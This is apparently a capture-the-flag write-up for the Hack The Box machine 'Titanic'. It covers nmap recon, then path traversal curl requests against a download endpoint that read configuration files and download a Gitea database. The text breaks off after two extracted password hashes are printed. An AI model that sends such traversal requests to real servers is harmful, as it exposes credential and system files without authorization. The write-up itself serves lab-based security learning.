# Titanic Write-up

<img src="https://labs.hackthebox.com/storage/avatars/eb5942ec56dd9b6feb06dcf8af8aefc6.png" width="200" height="200">

## Recon

### Nmap

`nmap -sC -sV 10.10.11.55`

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
    |_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
    80/tcp open  http    Apache httpd 2.4.52
    |_http-title: Did not follow redirect to http://titanic.htb/
    |_http-server-header: Apache/2.4.52 (Ubuntu)
    Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Add host to `/etc/hosts`.

    echo "10.10.11.55 titanic.htb" | sudo tee -a /etc/hosts

## Exploitation

Titanic.htb main page:

![image](https://github.com/user-attachments/assets/71b40b1e-ff64-4f32-856d-54d159f23f17)

Book Your trip button

![image](https://github.com/user-attachments/assets/c4724f5d-2e45-43bd-aa4c-952e75998a42)

JSON file

![image](https://github.com/user-attachments/assets/2c105d92-c095-4a81-ae7a-f8fa08526f2e)

Request

![image](https://github.com/user-attachments/assets/c06f2384-b385-4148-a83f-e138ee65b364)

`/etc/passwd`

![image](https://github.com/user-attachments/assets/734d26d3-21bb-4858-a1fb-457834fd781f)

`/home/developer:/bin/bash`

![image](https://github.com/user-attachments/assets/003d0b52-b483-4573-a66f-85388ff02034)


Get the user flag!

![image](https://github.com/user-attachments/assets/09c488a2-b053-4995-9238-e1645627e117)

### Privilege escalation

Read `/etc/hosts`

![image](https://github.com/user-attachments/assets/2c5d511c-ba55-4c23-88e9-dbe511d1827c)

![image](https://github.com/user-attachments/assets/1cfb7600-e9eb-4e33-b328-486f4aaf510a)

Add `dev` subdomain to /etc/hosts on our machine!

    echo "10.10.11.55 dev.titanic.htb" | sudo tee -a /etc/hosts

dev.titanic.htb page

![image](https://github.com/user-attachments/assets/dcc13324-0065-4100-a93e-bf6aa610ecaf)

![image](https://github.com/user-attachments/assets/1172ba9c-2c0a-4ddf-b862-59a55bff68a2)

![image](https://github.com/user-attachments/assets/16f2df5c-2c1d-4d1d-b43a-b7a5f75fcc00)

![image](https://github.com/user-attachments/assets/ce09544c-a113-4fa2-aeac-8ae117163f06)

    curl --path-as-is 'http://titanic.htb/download?ticket=../../../home/developer/gitea/data/gitea/conf/app.ini'

![image](https://github.com/user-attachments/assets/5266dcb4-847a-4764-9000-5e95937617a1)

     /download?ticket=/home/developer/gitea/data/gitea/gitea.db

![image](https://github.com/user-attachments/assets/bc683fe5-e5e5-4f29-b383-8b0115d1bf71)

    curl --path-as-is 'http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db' --output database

![image](https://github.com/user-attachments/assets/06bd7efb-ce02-4a1e-875f-2c7263d42e50)

sqlitebrowser

![image](https://github.com/user-attachments/assets/cc4e3c59-08f5-4824-bcef-0229057b30b3)

`administrator`:`root@titanic.htb`:`cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136`

`administrator`:`developer@titanic.htb`:`e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56`

Hashcat



